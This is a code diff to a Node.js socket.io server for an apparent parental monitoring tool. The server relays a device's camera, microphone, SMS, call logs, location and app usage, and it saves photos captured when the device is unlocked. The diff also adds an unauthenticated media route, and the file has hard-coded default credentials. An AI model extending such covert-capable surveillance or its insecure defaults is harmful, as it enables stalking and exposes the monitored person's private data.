@@ -9,10 +9,15 @@ const os = require('os');
 
 const app = express();
 const server = http.createServer(app);
-const io = new Server(server, { cors: { origin: '*' } });
+const io = new Server(server, {
+  cors: { origin: '*' },
+  pingInterval: 8000,   // server pings child every 8s
+  pingTimeout:  5000,   // declares offline if no pong in 5s → detects power-off in ~13s
+});
 
 app.use(cors());
 app.use(express.json());
+app.use('/media', express.static(path.join(os.homedir(), 'Desktop', 'MDM-Screenshots')));
 
 const JWT_SECRET = process.env.JWT_SECRET || 'change-this-secret-in-production';
 const parentAccounts = [{ email: 'parent@example.com', password: 'changeme123' }];
@@ -82,7 +87,22 @@ io.on('connection', socket => {
     });
 
     socket.on('camera:frame',    data => io.emit('camera:frame',    { deviceId, ...data }));
-    socket.on('screen:frame',    data => io.emit('screen:frame',    { deviceId, ...data }));
+    socket.on('camera:error',    data => io.emit('camera:error',    { deviceId, ...data }));
+    socket.on('location:update', data => io.emit('location:update', { deviceId, ...data }));
+    socket.on('screen:status',   data => io.emit('screen:status',   { deviceId, ...data }));
+    socket.on('recent:apps',     data => io.emit('recent:apps',     { deviceId, ...data }));
+    socket.on('unlock:photo', ({ frame, timestamp }) => {
+      try {
+        const folder = path.join(getScreenshotFolder(deviceId), 'UnlockPhotos');
+        fs.mkdirSync(folder, { recursive: true });
+        const ts = new Date(timestamp).toISOString().replace(/[:.]/g, '-');
+        const filename = `${ts}.jpg`;
+        const filepath = path.join(folder, filename);
+        fs.writeFileSync(filepath, Buffer.from(frame, 'base64'));
+        io.emit('unlock:photo:saved', { deviceId, filename, filepath,
+          url: `/media/${deviceId}/UnlockPhotos/${filename}`, timestamp });
+      } catch (err) { console.error('Unlock photo error:', err.message); }
+    });
     socket.on('mic:audio',       data => io.emit('mic:audio',       { deviceId, ...data }));
     socket.on('mic:state',       data => io.emit('mic:state',       { deviceId, ...data }));
     socket.on('call:logs',       data => io.emit('call:logs',       { deviceId, ...data }));
@@ -126,7 +146,8 @@ io.on('connection', socket => {
     relay('cmd:mic:on'); relay('cmd:mic:off');
     relay('cmd:screenshot');
     relay('cmd:get:calllogs'); relay('cmd:get:sms');
-    relay('cmd:screen:start'); relay('cmd:screen:stop');
+    relay('cmd:location:start'); relay('cmd:location:stop');
+    relay('cmd:get:recent:apps');
     relay('cmd:speak:live:start'); relay('cmd:speak:live:stop');
 
     socket.on('cmd:speak', ({ deviceId: devId, audioData }) => {
